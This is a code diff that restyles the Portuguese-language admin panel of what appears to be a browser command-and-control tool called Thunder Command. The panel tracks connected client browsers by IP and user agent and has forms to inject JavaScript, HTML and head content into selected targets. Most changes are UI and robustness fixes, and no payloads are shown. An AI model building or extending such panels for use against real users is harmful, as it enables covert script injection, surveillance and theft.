@@ -3,7 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Painel de Administração - Olho de Tandera</title>
+    <title>Painel de Administração - Thunder Command</title>
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="/static/favicon.ico">
+    <link rel="shortcut icon" type="image/x-icon" href="/static/favicon.ico">
     <!-- Google Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -14,6 +17,8 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha512-Avb2QiuDEEvB4bZJYdft2mNjVShBftLdPG8FJ0V7irTLQ8Uo0qcPxh4Plq7G5tGm0rU+1SPhVotteLpBERwTkw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <!-- CSS customizado -->
     <link rel="stylesheet" href="/static/css/olho-tandera.css">
+    <!-- Tema Dark Red customizado -->
+    <link rel="stylesheet" href="/static/css/custom-dark-red.css">
     
     <!-- Bootstrap JS Bundle com Popper -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/js/bootstrap.bundle.min.js" integrity="sha384-j1CDi7MgGQ12Z7Qab0qlWQ/Qqz24Gc6BM0thvEMVjHnfYGF0rmFCozFSxQBxwHKO" crossorigin="anonymous"></script>
@@ -28,6 +33,7 @@
     <script src="/static/js/user-agent-parser.js"></script>
     <!-- Ícones de navegador e sistema operacional -->
     <script src="/static/js/browser-os-icons.js"></script>
+
 </head>
 <body>
     <!-- Sidebar -->
@@ -35,11 +41,10 @@
         <div class="sidebar-header">
             <div class="sidebar-brand">
                 <div class="brand-icon" title="Clique para expandir">
-                    <i class="fas fa-eye"></i>
+                    <img src="/static/img/logo.png" alt="Logo Thunder Command" width="100" height="100">
                 </div>
                 <div class="brand-text">
-                    <h1 id="sidebar-title">Olho de Tandera</h1>
-                    <span class="brand-subtitle">Sistema de Monitoramento</span>
+                    <h1 id="sidebar-title">Thunder COMMAND</h1>
                 </div>
             </div>
             <button class="sidebar-toggle" id="sidebar-toggle">
@@ -94,10 +99,21 @@
         <!-- Dashboard Section -->
         <div class="content-page active" id="dashboard-page">
             <div class="d-flex justify-content-between align-items-center mb-4">
-                <h1 class="mb-0">Dashboard</h1>
-                <button class="btn btn-outline-dark" onclick="refreshDashboard()">
-                    <i class="fas fa-sync-alt"></i> Atualizar
-                </button>
+                <div class="dashboard-header">
+                    <h1 class="mb-0">Dashboard</h1>
+                    <span class="dashboard-status">
+                        <i class="fas fa-circle-dot text-success me-1"></i> Sistema Online
+                    </span>
+                </div>
+                <div class="dashboard-actions">
+                    <div class="current-time me-3">
+                        <i class="far fa-clock"></i>
+                        <span id="current-time">00:00:00</span>
+                    </div>
+                    <button class="btn btn-accent" onclick="refreshDashboard()">
+                        <i class="fas fa-sync-alt"></i> Atualizar
+                    </button>
+                </div>
             </div>
 
             <!-- Stats Row -->
@@ -225,12 +241,12 @@
         <!-- Commands Section -->
         <div class="content-page" id="commands-page">
             <div class="d-flex justify-content-between align-items-center mb-4">
-                <h1 class="mb-0">Comandos</h1>
+                <h2 class="mb-0" style="margin-top: 25px;"><i class="fas fa-terminal me-2"></i>Comandos</h2>
                 <div id="client-selector" class="d-none">
                     <div class="alert alert-dark">
                         <i class="fas fa-user-circle me-2"></i>
                         Cliente selecionado: <strong id="selected-client-id">Nenhum</strong>
-                        <button class="btn btn-sm btn-outline-light ms-3" id="clear-selection">
+                        <button class="btn btn-sm btn-outline-danger ms-3" id="clear-selection">
                             <i class="fas fa-times"></i> Limpar
                         </button>
                     </div>
@@ -253,27 +269,86 @@
                     <!-- Seção de Informações do Cliente -->
                     <div id="client-info-section" class="mb-4 d-none">
                         <div class="card border-accent card-green">
-                            <div class="card-header  d-flex align-items-center">
-                                <i class="fas fa-info-circle me-2 text-accent"></i>
-                                <span>Informações do Cliente Selecionado</span>
+                            <div class="card-header d-flex align-items-center justify-content-between">
+                                <div>
+                                    <i class="fas fa-info-circle me-2 text-accent"></i>
+                                    <span>Informações do Cliente Selecionado</span>
+                                </div>
+                                <div class="client-status-badge" id="client-status-badge">
+                                    <span class="badge bg-secondary">Status Desconhecido</span>
+                                </div>
                             </div>
                             <div class="card-body">
-                                <div class="row">
-                                    <div class="col-md-6">
-                                        <p><strong>ID: </strong><code><span id="info-client-id">-</span></code></p>
-                                        <p><strong>Status:</strong> <span id="info-client-status">-</span></p>
-                                        <p><strong>IP:</strong> <code><span id="info-client-ip">-</span></code></p>
-                                        <p><strong>Browser:</strong> <span id="info-client-browser">-</span></p>
+                                <div class="client-info-header mb-3">
+                                    <div class="client-avatar">
+                                        <i class="fas fa-user-circle"></i>
+                                        <span class="client-indicator" id="client-indicator"></span>
                                     </div>
-                                    <div class="col-md-6">
-                                        <p><strong>Última Atividade:</strong> <span id="info-client-last-activity">-</span></p>
-                                        <p><strong>Tipo de Conexão:</strong> <span id="info-client-connection">-</span></p>
-                                        <p><strong>Sistema Operacional:</strong> <span id="info-client-os">-</span></p>
-                                        <p class="small text-muted"><a href="#" id="show-user-agent" onclick="toggleUserAgent(); return false;">Ver User-Agent completo</a></p>
+                                    <div class="client-primary-info">
+                                        <h5 id="info-client-id-title">Cliente</h5>
+                                        <div class="client-tech-tags" id="client-tech-tags">
+                                            <!-- Badges serão inseridas dinamicamente -->
+                                        </div>
                                     </div>
                                 </div>
-                                <div id="user-agent-details" class="mt-2 d-none">
-                                    <div class="alert alert-secondary">
+                                
+                                <div class="row info-grid">
+                                    <div class="col-md-6">
+                                        <div class="info-item">
+                                            <div class="info-icon"><i class="fas fa-fingerprint"></i></div>
+                                            <div class="info-content">
+                                                <span class="info-label">ID</span>
+                                                <span class="info-value"><code id="info-client-id">-</code></span>
+                                            </div>
+                                        </div>
+                                        <div class="info-item">
+                                            <div class="info-icon"><i class="fas fa-globe"></i></div>
+                                            <div class="info-content">
+                                                <span class="info-label">IP</span>
+                                                <span class="info-value"><code id="info-client-ip">-</code></span>
+                                            </div>
+                                        </div>
+                                        <div class="info-item">
+                                            <div class="info-icon"><i class="fas fa-window-maximize"></i></div>
+                                            <div class="info-content">
+                                                <span class="info-label">Browser</span>
+                                                <span class="info-value" id="info-client-browser">-</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="col-md-6">
+                                        <div class="info-item">
+                                            <div class="info-icon"><i class="fas fa-clock"></i></div>
+                                            <div class="info-content">
+                                                <span class="info-label">Última Atividade</span>
+                                                <span class="info-value" id="info-client-last-activity">-</span>
+                                            </div>
+                                        </div>
+                                        <div class="info-item">
+                                            <div class="info-icon"><i class="fas fa-network-wired"></i></div>
+                                            <div class="info-content">
+                                                <span class="info-label">Conexão</span>
+                                                <span class="info-value" id="info-client-connection">-</span>
+                                            </div>
+                                        </div>
+                                        <div class="info-item">
+                                            <div class="info-icon"><i class="fas fa-desktop"></i></div>
+                                            <div class="info-content">
+                                                <span class="info-label">Sistema</span>
+                                                <span class="info-value" id="info-client-os">-</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <div class="mt-3">
+                                    <button class="btn btn-sm btn-outline-accent" id="show-user-agent" onclick="toggleUserAgent(); return false;">
+                                        <i class="fas fa-info-circle"></i> Ver User-Agent completo
+                                    </button>
+                                </div>
+                                
+                                <div id="user-agent-details" class="mt-3 d-none">
+                                    <div class="alert alert-secondary user-agent-container">
                                         <small id="info-client-agent" class="user-agent-full">-</small>
                                     </div>
                                 </div>
@@ -318,7 +393,7 @@
                                 <label for="js-command" class="form-label">Inject JavaScript:</label>
                                 <textarea id="js-command" class="form-control code-editor" placeholder="Digite o código JavaScript aqui..."></textarea>
                                 <div class="d-flex justify-content-end mt-3">
-                                    <button onclick="previewCommand('js')" class="btn btn-outline-dark me-2">
+                                    <button onclick="previewCommand('js')" class="btn btn-outline-danger me-2">
                                         <i class="fas fa-eye"></i> Preview
                                     </button>
                                     <button onclick="sendCommand('js')" class="btn btn-accent">
@@ -334,7 +409,7 @@
                                 <label for="html-content" class="form-label">Inject HTML:</label>
                                 <textarea id="html-content" class="form-control code-editor" placeholder="Digite o HTML a ser injetado..."></textarea>
                                 <div class="d-flex justify-content-end mt-3">
-                                    <button onclick="previewCommand('html')" class="btn btn-outline-dark me-2">
+                                    <button onclick="previewCommand('html')" class="btn btn-outline-danger me-2">
                                         <i class="fas fa-eye"></i> Preview
                                     </button>
                                     <button onclick="sendCommand('html')" class="btn btn-accent">
@@ -366,7 +441,7 @@
                                 <textarea id="manipulation-content" class="form-control code-editor" placeholder="Conteúdo a ser manipulado..."></textarea>
                             </div>
                             <div class="d-flex justify-content-end">
-                                <button onclick="previewCommand('manipulate')" class="btn btn-outline-dark me-2">
+                                <button onclick="previewCommand('manipulate')" class="btn btn-outline-danger me-2">
                                     <i class="fas fa-eye"></i> Preview
                                 </button>
                                 <button onclick="sendCommand('manipulate')" class="btn btn-accent">
@@ -413,7 +488,7 @@
                                 <textarea id="head-content" class="form-control code-editor" placeholder="URL ou conteúdo inline..."></textarea>
                             </div>
                             <div class="d-flex justify-content-end">
-                                <button onclick="previewCommand('head')" class="btn btn-outline-dark me-2">
+                                <button onclick="previewCommand('head')" class="btn btn-outline-danger me-2">
                                     <i class="fas fa-eye"></i> Preview
                                 </button>
                                 <button onclick="sendCommand('head')" class="btn btn-accent">
@@ -439,8 +514,8 @@
         <!-- Logs Section -->
         <div class="content-page" id="logs-page">
             <div class="d-flex justify-content-between align-items-center mb-4">
-                <h1 class="mb-0">Logs</h1>
-                <button class="btn btn-outline-dark" onclick="refreshLogs()">
+                <h2 class="mb-0"><i class="fas fa-table-list me-2"></i>Logs</h2>
+                <button class="btn btn-outline-danger logs-refresh-button" onclick="refreshLogs()">
                     <i class="fas fa-sync-alt"></i> Atualizar
                 </button>
             </div>
@@ -450,7 +525,7 @@
                 <div class="console-header">
                     <h2 class="console-title"><i class="fas fa-history"></i> Histórico de Comandos</h2>
                     <div>
-                        <button class="console-button" onclick="toggleFullscreen()" title="Tela cheia">
+                        <button class="console-button theme-dark-red" onclick="toggleFullscreen()" title="Tela cheia">
                             <i class="fas fa-expand"></i>
                         </button>
                     </div>
@@ -459,7 +534,7 @@
                 <!-- Console Content -->
                 <div class="console-body">
                     <div id="logs-list">
-                        <p class="text-center p-4">
+                        <p class="text-center p-4 logs-loading">
                             <i class="fas fa-circle-notch fa-spin me-2"></i> Carregando logs...
                         </p>
                     </div>
@@ -471,11 +546,11 @@
                 <div class="card-header d-flex justify-content-between align-items-center">
                     <span><i class="fas fa-users me-2"></i> Cliente Alvo para Execução de Comandos</span>
                     <div>
-                        <select id="console-target-client" class="form-select form-select-sm d-inline-block me-2" style="width: 250px;">
+                        <select id="console-target-client" class="form-select form-select-sm d-inline-block me-2 console-select" style="width: 250px;">
                             <option value="default">Todos os clientes</option>
                             <!-- Opções carregadas dinamicamente -->
                         </select>
-                        <button class="console-button" onclick="refreshClientsForConsole()" title="Atualizar lista de clientes">
+                        <button class="console-button theme-dark-red" onclick="refreshClientsForConsole()" title="Atualizar lista de clientes">
                             <i class="fas fa-sync-alt"></i>
                         </button>
                     </div>
@@ -1090,8 +1165,19 @@
             fetch('/admin/clients')
                 .then(response => response.json())
                 .then(data => {
-                    const clientsTable = document.getElementById('clients-table');
+                    // Usar dashboard-clients-table caso clients-table não exista
+                    const clientsTable = document.getElementById('clients-table') || document.getElementById('dashboard-clients-table');
+                    
+                    if (!clientsTable) {
+                        console.warn("Tabela de clientes não encontrada (nem clients-table nem dashboard-clients-table)");
+                        return;
+                    }
+                    
                     const tableBody = clientsTable.querySelector('tbody');
+                    if (!tableBody) {
+                        console.warn("Corpo da tabela não encontrado");
+                        return;
+                    }
                     
                     // Counts for stats display
                     let websocketCount = 0;
@@ -1166,32 +1252,42 @@
                         
                         // Verificar se temos sistema de paginação
                         if (window.TablePagination) {
-                            // Encontrar instância de paginação para esta tabela ou criar uma nova
-                            const paginationInstance = Object.values(window).find(
-                                obj => obj instanceof TablePagination && obj.tableId === 'clients-table'
-                            );
-                            
-                            if (paginationInstance) {
-                                // Apenas atualize os dados da tabela via sistema de paginação
-                                paginationInstance.updateData(clientRowsHtml);
-                            } else {
-                                // Fallback para o método padrão
+                            try {
+                                // Encontrar instância de paginação para esta tabela ou criar uma nova
+                                const paginationInstance = Object.values(window).find(
+                                    obj => obj instanceof TablePagination && obj.tableId === clientsTable.id
+                                );
+                                
+                                if (paginationInstance) {
+                                    // Apenas atualize os dados da tabela via sistema de paginação
+                                    paginationInstance.updateData(clientRowsHtml);
+                                } else {
+                                    // Fallback para o método padrão
+                                    tableBody.innerHTML = clientRowsHtml.join('');
+                                    // Inicialize a paginação
+                                    new TablePagination(clientsTable.id, { rowsPerPage: 10 });
+                                }
+                            } catch (err) {
+                                console.error("Erro ao aplicar paginação:", err);
                                 tableBody.innerHTML = clientRowsHtml.join('');
-                                // Inicialize a paginação
-                                new TablePagination('clients-table', { rowsPerPage: 10 });
                             }
                         } else {
                             // Se não tiver paginação, apenas atualize a tabela normalmente
                             tableBody.innerHTML = clientRowsHtml.join('');
                         }
                         
-                        // Update stats display
-                        document.getElementById('websocket-count').textContent = websocketCount;
-                        document.getElementById('polling-count').textContent = pollingCount;
+                        // Update stats display com verificações para elementos que podem não existir
+                        const websocketCountEl = document.getElementById('websocket-count');
+                        const pollingCountEl = document.getElementById('polling-count');
+                        
+                        if (websocketCountEl) websocketCountEl.textContent = websocketCount;
+                        if (pollingCountEl) pollingCountEl.textContent = pollingCount;
                         
                         // Adiciona efeito de atualização aos contadores
                         ['websocket-count', 'polling-count'].forEach(id => {
                             const counter = document.getElementById(id);
+                            if (!counter) return;
+                            
                             counter.style.color = 'var(--accent-color)';
                             counter.style.textShadow = '0 0 5px var(--accent-color)';
                             
@@ -1205,56 +1301,86 @@
                         // Update client dropdown
                         updateClientDropdown(data.clients);
                     } else {
-                        tableBody.innerHTML = '<tr><td colspan="7" class="text-center">Nenhum cliente encontrado.</td></tr>';
-                        document.getElementById('websocket-count').textContent = '0';
-                        document.getElementById('polling-count').textContent = '0';
+                        tableBody.innerHTML = '<tr><td colspan="8" class="text-center">Nenhum cliente encontrado.</td></tr>';
+                        
+                        const websocketCountEl = document.getElementById('websocket-count');
+                        const pollingCountEl = document.getElementById('polling-count');
+                        
+                        if (websocketCountEl) websocketCountEl.textContent = '0';
+                        if (pollingCountEl) pollingCountEl.textContent = '0';
                     }
                 })
                 .catch(error => {
                     console.error('Error loading clients:', error);
-                    document.querySelector('#clients-table tbody').innerHTML = 
-                        '<tr><td colspan="7" class="text-center text-danger">Erro ao carregar clientes: ' + error.message + '</td></tr>';
+                    
+                    // Procurar a tabela que existe
+                    const clientsTable = document.getElementById('clients-table') || document.getElementById('dashboard-clients-table');
+                    if (clientsTable) {
+                        const tableBody = clientsTable.querySelector('tbody');
+                        if (tableBody) {
+                            tableBody.innerHTML = '<tr><td colspan="8" class="text-center text-danger">Erro ao carregar clientes: ' + error.message + '</td></tr>';
+                        }
+                    }
                 });
         }
         
         function updateClientDropdown(clients) {
             const dropdown = document.getElementById('target-client');
             
-            // Keep default option
-            const defaultOption = dropdown.options[0];
-            dropdown.innerHTML = '';
-            dropdown.appendChild(defaultOption);
-            
-            // Add clients
-            clients.forEach(client => {
-                const option = document.createElement('option');
-                option.value = client.id;
-                
-                const status = client.active ? 'online' : 'offline';
-                const connection = client.websocket ? '⚡' : '';
-                option.textContent = `Cliente: ${client.id.substring(0, 8)}... (${status}) ${connection}`;
-                
-                if (!client.active) {
-                    option.disabled = true;
-                }
-                
-                dropdown.appendChild(option);
-            });
-            
-            // Adicionar event listener para o dropdown, se ainda não tiver sido adicionado
-            if (!dropdown.hasAttribute('data-has-listener')) {
-                dropdown.addEventListener('change', updateSelectedClientInfo);
-                dropdown.setAttribute('data-has-listener', 'true');
+            if (!dropdown) {
+                console.warn("Elemento dropdown target-client não encontrado");
+                return;
             }
             
-            // Atualiza as informações do cliente inicialmente
-            updateSelectedClientInfo();
+            // Keep default option
+            if (dropdown.options && dropdown.options.length > 0) {
+                const defaultOption = dropdown.options[0];
+                dropdown.innerHTML = '';
+                dropdown.appendChild(defaultOption);
+            } else {
+                dropdown.innerHTML = '<option value="default">Todos os clientes</option>';
+            }
+            
+            // Add clients
+            if (clients && clients.length > 0) {
+                clients.forEach(client => {
+                    const option = document.createElement('option');
+                    option.value = client.id;
+                    
+                    const status = client.active ? 'online' : 'offline';
+                    const connection = client.websocket ? '⚡' : '';
+                    option.textContent = `Cliente: ${client.id.substring(0, 8)}... (${status}) ${connection}`;
+                    
+                    if (!client.active) {
+                        option.disabled = true;
+                    }
+                    
+                    dropdown.appendChild(option);
+                });
+                
+                // Adicionar event listener para o dropdown, se ainda não tiver sido adicionado
+                if (!dropdown.hasAttribute('data-has-listener')) {
+                    dropdown.addEventListener('change', updateSelectedClientInfo);
+                    dropdown.setAttribute('data-has-listener', 'true');
+                }
+                
+                // Atualiza as informações do cliente inicialmente
+                if (typeof updateSelectedClientInfo === 'function') {
+                    updateSelectedClientInfo();
+                }
+            }
         }
         
         // Função para atualizar as informações do cliente selecionado
         function updateSelectedClientInfo() {
             const dropdown = document.getElementById('target-client');
             const clientInfoSection = document.getElementById('client-info-section');
+            
+            // Verificar se os elementos necessários existem
+            if (!dropdown || !clientInfoSection) {
+                console.warn("Elementos necessários não encontrados para updateSelectedClientInfo");
+                return;
+            }
             
             // Se o valor for default, esconde a seção de informações
             if (dropdown.value === 'default') {
@@ -1266,27 +1392,85 @@
             fetch(`/admin/client/${dropdown.value}`)
                 .then(response => response.json())
                 .then(client => {
-                    if (client) {
-                        // Preenche as informações do cliente
-                        document.getElementById('info-client-id').textContent = client.id;
-                        document.getElementById('info-client-status').textContent = client.active ? 'Online' : 'Offline';
-                        document.getElementById('info-client-status').className = client.active ? 'text-success' : 'text-danger';
-                        document.getElementById('info-client-ip').textContent = client.ip || 'N/A';
-                        document.getElementById('info-client-last-activity').textContent = 
-                            client.last_activity ? new Date(client.last_activity).toLocaleString() : 'N/A';
-                        document.getElementById('info-client-connection').textContent = client.websocket ? 'WebSocket ⚡' : 'Polling';
-                        document.getElementById('info-client-connection').className = client.websocket ? 'text-accent' : '';
+                    if (client && Object.keys(client).length > 0) {
+                        // Função auxiliar para atualizar texto com verificação de nulo
+                        const safeUpdateText = (elementId, text) => {
+                            const element = document.getElementById(elementId);
+                            if (element) element.textContent = text;
+                        };
+                        
+                        // Função auxiliar para atualizar classe com verificação de nulo
+                        const safeUpdateClass = (elementId, className) => {
+                            const element = document.getElementById(elementId);
+                            if (element) element.className = className;
+                        };
+                        
+                        // Preenche as informações do cliente com verificações
+                        safeUpdateText('info-client-id', client.id);
+                        safeUpdateText('info-client-id-title', `Cliente ${client.id.substring(0, 8)}`);
+                        
+                        // Atualiza o indicador de status
+                        const clientIndicator = document.getElementById('client-indicator');
+                        if (clientIndicator) {
+                            clientIndicator.className = 'client-indicator';
+                            clientIndicator.classList.add(client.active ? 'online' : 'offline');
+                        }
+                        
+                        // Atualiza o badge de status
+                        const statusBadge = document.getElementById('client-status-badge');
+                        if (statusBadge) {
+                            if (client.active) {
+                                statusBadge.innerHTML = '<span class="badge bg-success">Online</span>';
+                            } else {
+                                statusBadge.innerHTML = '<span class="badge bg-danger">Offline</span>';
+                            }
+                        }
+                        
+                        // Preenche as tags de tecnologia
+                        const techTags = document.getElementById('client-tech-tags');
+                        if (techTags) {
+                            const userAgent = client.user_agent || 'N/A';
+                            const parsedUA = parseUserAgent(userAgent);
+                            
+                            // Limpa as tags existentes
+                            techTags.innerHTML = '';
+                            
+                            // Adiciona as novas tags
+                            if (client.websocket) {
+                                techTags.innerHTML += `<span class="tech-badge"><i class="fas fa-bolt"></i> WebSocket</span>`;
+                            } else {
+                                techTags.innerHTML += `<span class="tech-badge"><i class="fas fa-sync"></i> Polling</span>`;
+                            }
+                            
+                            // Adiciona o navegador
+                            if (parsedUA.browser) {
+                                techTags.innerHTML += `<span class="tech-badge"><i class="fas fa-globe"></i> ${parsedUA.browser}</span>`;
+                            }
+                            
+                            // Adiciona o sistema operacional
+                            if (parsedUA.os) {
+                                techTags.innerHTML += `<span class="tech-badge"><i class="fas fa-desktop"></i> ${parsedUA.os}</span>`;
+                            }
+                        }
+                        
+                        safeUpdateText('info-client-ip', client.ip || 'N/A');
+                        safeUpdateText('info-client-last-activity', 
+                            client.last_activity ? new Date(client.last_activity).toLocaleString() : 'N/A');
+                        safeUpdateText('info-client-connection', client.websocket ? 'WebSocket ⚡' : 'Polling');
                         
                         // Detalhes de plataforma (navegador e sistema operacional)
                         const userAgent = client.user_agent || 'N/A';
                         const parsedUA = parseUserAgent(userAgent);
-                        document.getElementById('info-client-browser').textContent = parsedUA.browser;
-                        document.getElementById('info-client-os').textContent = parsedUA.os;
-                        document.getElementById('info-client-agent').textContent = userAgent;
+                        safeUpdateText('info-client-browser', parsedUA.browser);
+                        safeUpdateText('info-client-os', parsedUA.os);
+                        safeUpdateText('info-client-agent', userAgent);
                         
                         // Oculta os detalhes do User-Agent inicialmente
-                        document.getElementById('user-agent-details').classList.add('d-none');
-                        document.getElementById('show-user-agent').textContent = 'Ver User-Agent completo';
+                        const userAgentDetails = document.getElementById('user-agent-details');
+                        const showUserAgentBtn = document.getElementById('show-user-agent');
+                        
+                        if (userAgentDetails) userAgentDetails.classList.add('d-none');
+                        if (showUserAgentBtn) showUserAgentBtn.innerHTML = '<i class="fas fa-info-circle"></i> Ver User-Agent completo';
                         
                         // Exibe a seção de informações
                         clientInfoSection.classList.remove('d-none');
@@ -1432,39 +1616,68 @@
          * Atualiza todas as tabelas de clientes no dashboard e na página de clientes
          */
         function refreshClientsTables() {
-            // Exibe um indicador de carregamento
-            showNeonToast("Atualizando dados dos clientes...", "info", 1000);
-            
-            // Atualiza a lista principal de clientes na página de clientes
-            refreshClients();
-            
-            // Atualiza o dashboard de clientes
-            fetchDashboardClients();
-            
-            // Atualiza os contadores e estatísticas
-            fetchClientStats();
-            
-            // Atualiza também os logs que podem conter informações dos clientes
-            if (typeof refreshLogs === 'function') {
-                refreshLogs();
+            try {
+                // Verifica se a função showNeonToast existe e só então chama
+                if (typeof showNeonToast === 'function') {
+                    showNeonToast("Atualizando dados dos clientes...", "info", 1000);
+                }
+                
+                // Verifica se a página de clientes existe antes de atualizar
+                if (document.querySelector('.clients-page, #clients-page')) {
+                    // Atualiza a lista principal de clientes na página de clientes
+                    refreshClients();
+                } else {
+                    // Ainda tenta atualizar mesmo se o elemento não existir explicitamente
+                    refreshClients();
+                }
+                
+                // Atualiza o dashboard de clientes, se a função existir
+                if (typeof fetchDashboardClients === 'function') {
+                    fetchDashboardClients();
+                }
+                
+                // Atualiza os contadores e estatísticas, se a função existir
+                if (typeof fetchClientStats === 'function') {
+                    fetchClientStats();
+                }
+                
+                // Atualiza também os logs que podem conter informações dos clientes
+                if (typeof refreshLogs === 'function') {
+                    refreshLogs();
+                }
+                
+                // Preserva a seleção do cliente atual após a atualização
+                const targetClientEl = document.getElementById('target-client');
+                if (targetClientEl && targetClientEl.value && targetClientEl.value !== 'default') {
+                    const selectedClientId = targetClientEl.value;
+                    
+                    // Pequeno delay para garantir que as tabelas foram atualizadas
+                    setTimeout(() => {
+                        try {
+                            // Seleciona novamente o cliente para preservar o estado
+                            document.querySelectorAll(`tr[data-client-id="${selectedClientId}"]`).forEach(row => {
+                                row.classList.add('client-selected');
+                            });
+                        } catch (err) {
+                            console.warn("Não foi possível preservar a seleção de cliente:", err);
+                        }
+                    }, 500);
+                }
+                
+                // Mostra feedback visual para o usuário
+                if (typeof showNeonToast === 'function') {
+                    setTimeout(() => {
+                        showNeonToast("Tabelas de clientes atualizadas", "success", 2000);
+                    }, 1000);
+                }
+            } catch (err) {
+                console.error("Erro ao atualizar tabelas de clientes:", err);
+                
+                // Tenta mostrar feedback de erro
+                if (typeof showNeonToast === 'function') {
+                    showNeonToast("Erro ao atualizar clientes: " + err.message, "error", 3000);
+                }
             }
-            
-            // Preserva a seleção do cliente atual após a atualização
-            const selectedClientId = document.getElementById('target-client')?.value;
-            if (selectedClientId && selectedClientId !== 'default') {
-                // Pequeno delay para garantir que as tabelas foram atualizadas
-                setTimeout(() => {
-                    // Seleciona novamente o cliente para preservar o estado
-                    document.querySelectorAll(`tr[data-client-id="${selectedClientId}"]`).forEach(row => {
-                        row.classList.add('client-selected');
-                    });
-                }, 500);
-            }
-            
-            // Mostra feedback visual para o usuário
-            setTimeout(() => {
-                showNeonToast("Tabelas de clientes atualizadas", "success", 2000);
-            }, 1000);
         }
 
         // Funções para compatibilidade com o console-terminal.js
@@ -1478,6 +1691,53 @@
                 default: return 'badge-bg-secondary';
             }
         }
+        
+        // Atualizar o relógio
+        function updateClock() {
+            const now = new Date();
+            const timeString = now.toLocaleTimeString();
+            const clockElement = document.getElementById('current-time');
+            
+            if (clockElement) {
+                clockElement.textContent = timeString;
+                
+                // Efeito de pulso a cada segundo
+                clockElement.classList.add('pulse');
+                setTimeout(() => {
+                    clockElement.classList.remove('pulse');
+                }, 500);
+            }
+        }
+        
+        // Inicializar o relógio e atualizá-lo a cada segundo
+        setInterval(updateClock, 1000);
+        updateClock(); // Executar imediatamente
+        
+        // Função de inicialização ao carregar a página
+        document.addEventListener('DOMContentLoaded', function() {
+            // Atualizar dados iniciais
+            refreshDashboard();
+            
+            // Adicionar efeitos de hover aos cards de estatísticas
+            const statsCards = document.querySelectorAll('.stats-card');
+            if (statsCards) {
+                statsCards.forEach(card => {
+                    card.addEventListener('mouseover', function() {
+                        const icon = this.querySelector('.stats-icon');
+                        if (icon) {
+                            icon.classList.add('pulse-animation');
+                        }
+                    });
+                    
+                    card.addEventListener('mouseout', function() {
+                        const icon = this.querySelector('.stats-icon');
+                        if (icon) {
+                            icon.classList.remove('pulse-animation');
+                        }
+                    });
+                });
+            }
+        });
     </script>
 </body>
 </html>
